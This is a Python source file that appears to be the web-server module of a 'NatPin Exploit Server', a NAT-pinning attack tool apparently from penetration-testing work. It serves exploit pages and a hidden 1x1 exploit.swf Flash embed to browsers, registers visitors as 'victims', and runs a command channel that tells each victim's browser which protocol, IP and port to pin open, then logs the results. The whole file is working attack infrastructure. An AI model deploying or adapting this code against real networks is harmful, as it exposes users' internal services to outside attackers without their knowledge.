#!/usr/bin/env python
#filename=web.py
#This module acts as a very simple HTTP webserver and will feed the exploit page.

from base import *
import socket
import random
import struct
import select
import time
import uuid
import base64
from datetime import datetime

class HTTPProtoHandler(asyncore.dispatcher_with_send):
	REQPAGE = ""
	REQHEADER = ""
	REQHEADERDONE = 0
	def __init__(self,conn_sock, client_address, server):
		self.REQHEADERDONE = 0
		self.REQHEADER = ""
		self.server=server
		asyncore.dispatcher_with_send.__init__(self,conn_sock) #Line is required
		self.server.log("Received connection from " + client_address[0] + ' on port ' + str(self.server.sPort),3)
	def get_header(self,req,header_name,splitter=":"):
		headers=req.split("\n")
		result = ""
		for header in headers:
			headerparts = header.split(splitter)
			if len(headerparts)>1:
				if headerparts[0].strip().upper()==header_name.upper():
					result = header.strip()
		return result
	def handle_cmd(self,command):
		"""Validates command structure, sends data for processing to engine (self.server.CALLER) and returns output to client"""
		cmd_parts = command.split("_")
		cmd = cmd_parts[0].upper().strip()
		result=""
		if cmd=="REG":
			if len(cmd_parts)!=2:
				self.server.log("Received invalid REG command : " + command,2)
			else:
				client_ip = cmd_parts[1].strip()
				if self.server.CALLER.isValidIPv4(client_ip)!=True:
					self.server.log("Received invalid IP for REG command : " + command,2)
				else:
					client_id = self.server.CALLER.registerVictim(self,client_ip)
					return client_id
		elif cmd=="POLL":
			if len(cmd_parts)!=3:
				self.server.log("Received invalid POLL command : " + command,0)
			else:
				#part[2] is random identifier, tobe discarded
				client_id = cmd_parts[1].strip()
				client = self.server.CALLER.getVictimByVictimId(client_id)
				if client != None:
					client.LAST_SEEN= datetime.now()
					for test in client.TESTS:
						if test.STATUS=="NEW":
							result = test.getTestString()
							break
				else:
					self.server.log("Received POLL command for unknown client: " + command,4)
		elif cmd=="ADD":
			if len(cmd_parts)!=6:
				self.server.log("Received invalid ADD command : " + command,2)
			else:
				client_id = cmd_parts[1].strip()
				client = self.server.CALLER.getVictimByVictimId(client_id)
				if client != None:
					client.LAST_SEEN= datetime.now()
					proto = cmd_parts[2].strip().upper()
					ip = cmd_parts[3].strip()
					port = cmd_parts[4].strip()
					if proto in self.server.CALLER.PROTOS and self.server.CALLER.isValidIPv4(ip) and self.server.CALLER.isValidPort(port):						
						#distrust whatever comes from the web
						result = client.addTest(proto,ip,port)
					else:
						self.server.log("Received invalid ADD command : " + command,2)
				else:
					self.server.log("Received ADD command for unknown client:  " + command,4)
		elif  cmd=="STATUS":
			if len(cmd_parts)!= 3:
				self.server.log("Received invalid STATUS command : " + command,2)
			else:
				test = self.server.CALLER.getVictimTest(cmd_parts[1].strip())
				if test != None:
					result = test.STATUS + " " + str(test.RESULT)
				else:
					result = "0"
		elif cmd=="GENFLASH" or cmd=="GENFLASHIE":
			if len(cmd_parts)!= 3:
				self.server.log("Received invalid GENFLASH command : " + command,2)
			else:
				result="""
<object id="flash" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="1" height="1">
	<param name="movie" value="exploit.swf">
	<param name="quality" value="high">
	<param name="AllowScriptAccess" value="always">
	<param name="bgcolor" value="FFFFFF">
	<param name="FlashVars" value="ci="""+cmd_parts[1]+"""&amp;server="""+cmd_parts[2].split(":")[0]+"""&amp;cmdURL=http://"""+cmd_parts[2]+"""/cli">
	<param name="wmode" value="window">
	<embed name="flash" src="exploit.swf" width="1" height="1" wmode="window" allowscriptaccess="always" bgcolor="FFFFFF" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" flashvars="ci="""+cmd_parts[1]+"""&amp;server="""+cmd_parts[2].split(":")[0]+"""&amp;cmdURL=http://"""+cmd_parts[2]+"""/cli">
	</embed>
</object>
"""
		elif cmd=="LIST":
			if len(cmd_parts)!= 2:
				self.server.log("Received invalid LIST command : " + command,2)
			else:
				client_id = cmd_parts[1].strip()
				client = self.server.CALLER.getVictimByVictimId(client_id)
				if client != None:
					for test in client.TESTS:
						result = result + test.TEST_ID + "|"  + test.STATUS + "|" + test.TEST_TYPE + "|" + str(test.RESULT) + "|" + test.PUBLIC_IP + "|" + test.PRIVATE_IP + "|" + test.PUBLIC_PORT + "|" + test.PRIVATE_PORT + "\n"
		if result=="": result="0"
		return result
	
	def handle_read(self):
		data = self.recv(1024)
		request = self.get_header(data,"GET", " ")
		cookie = self.get_header(data,"cookie", ":")
		if cookie == "":
			cookie = base64.urlsafe_b64encode(uuid.uuid4().bytes).replace("=","")
		else:
			cookie = cookie.split(" ")[1]
		_page = ""
		if request <>"":
			headerparts = request.split(" ")
			if headerparts[0]=="GET":
				_page = headerparts[1].replace("/","")
				if _page =="": _page = "admin.html"
				self.server.log("Victim requested page: " + _page,3)
		_page=_page.lower()
		page = _page.split("?")[0];
		if page != "":
			arrPages = ["admin.html","exploit.swf","admin.css","admin.js","tools.js","screen.js","gremwell_logo.png","exploit.html","exploit.css","exploit.js"]
			arrCommands = ["cli"]
			if page in arrPages:
				agent = self.get_header(data,"USER-AGENT",":")
				self.server.log("---" + agent,4)
				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nSet-Cookie: $cookie$\r\nContent-Length: $len$\r\n\r\n"""
				f = open("exploit/"+page,"r")
				body = f.read()
				f.close()		
			elif page in arrCommands:
				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nSet-Cookie: $cookie$\r\nContent-Length: $len$\r\n\r\n"""
				body=""
				if page=="cli":
					if len(_page.split("?"))!=2:
						body ="Invalid command."
					else:
						body=self.handle_cmd(_page.split("?")[1].strip())
				else:
					body=""
			else:
				respheader="""HTTP/1.1 404 NOT FOUND\r\nServer: NatPin Exploit Server\r\nSet-Cookie: $cookie$\r\nContent-Length: 0\r\n\r\n"""
				body = ""
			respheader = respheader.replace("$len$",str(len(body)))
			respheader = respheader.replace("$cookie$",cookie)
			self.send(respheader+body)
			#self.send(body)
#end class

class Server(Base):
	def __init__(self,serverPort=843, caller=None):
		self.TYPE = "Web Server"
		Base.__init__(self,"TCP",serverPort,caller)
		self.log("Started",2)
	#end def
	def protocolhandler(self,conn, addr):
		# FLASH POLICY FILE SUPPORT
		self.HANDLER = HTTPProtoHandler(conn,addr,self)
	#end def
#end class
